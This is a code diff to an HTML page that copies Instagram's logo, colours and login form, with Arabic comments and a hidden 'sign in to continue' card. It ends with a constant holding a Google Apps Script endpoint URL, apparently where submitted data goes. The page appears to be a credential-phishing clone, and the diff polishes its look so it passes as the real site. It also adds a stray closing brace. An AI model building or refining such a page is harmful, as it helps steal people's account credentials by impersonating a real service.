@@ -62,32 +62,41 @@ button{
 }
 @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
 
+/* تحسين الخط والشعار */
 .insta-logo {
-    font-family: 'Grand Hotel', cursive, sans-serif;
-    font-size: 40px;
-    margin: 0 0 10px 0;
+    font-family: 'Grand Hotel', cursive;
+    font-size: 45px;
+    margin: 10px 0 15px 0;
     color: #262626;
     font-weight: normal;
+    letter-spacing: 1px;
 }
 
 .insta-subtext {
     color: #737373;
     font-size: 13px;
-    margin-bottom: 15px;
+    margin-bottom: 20px;
 }
 
+/* ظبط الاتجاه والنصوص داخل الخانات */
 .input-group input {
     width: 100%;
     background: #fafafa;
     border: 1px solid #dbdbdb;
-    border-radius: 6px;
-    padding: 9px 12px;
+    border-radius: 4px;
+    padding: 10px 10px;
     margin-bottom: 8px;
-    font-size: 13px;
+    font-size: 12px;
     outline: none;
     box-sizing: border-box;
+    text-align: right;
 }
 
+.input-group input:focus {
+    border-color: #a8a8a8;
+}
+
+/* الأزرار */
 .insta-btn-blue {
     width: 100%;
     background-color: #0095f6;
@@ -98,11 +107,12 @@ button{
     font-weight: 600;
     font-size: 14px;
     cursor: pointer;
+    margin-top: 8px;
 }
 
 .insta-btn-primary {
     width: 100%;
-    background-color: #262626;
+    background-color: #1a1f2c;
     color: #ffffff;
     border: none;
     border-radius: 8px;
@@ -110,12 +120,13 @@ button{
     font-weight: 600;
     cursor: pointer;
 }
+}
 </style>
 </head>
 
 <body>
 
-  <!-- الكارد الأول -->
+ <!-- الكارد الأول -->
 <div class="card">
     <h1 class="insta-logo">Instagram</h1>
     <button onclick="startDemo()" class="insta-btn-primary">
@@ -123,7 +134,7 @@ button{
     </button>
 </div>
 
-<!-- كارد تسجيل الدخول -->
+<!-- كارد تسجيل الدخول (مخفي في الأول) -->
 <div id="login" class="card" style="display:none;">
     <h1 class="insta-logo">Instagram</h1>
     <p class="insta-subtext">سجل الدخول للمتابعة</p>
@@ -140,9 +151,6 @@ button{
 
     <div id="result" style="display:none; margin-top: 15px;"></div>
 </div>
-
-        <div id="result"></div>
-    </div> <!-- وسم إغلاق الـ card -->
 
 <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";
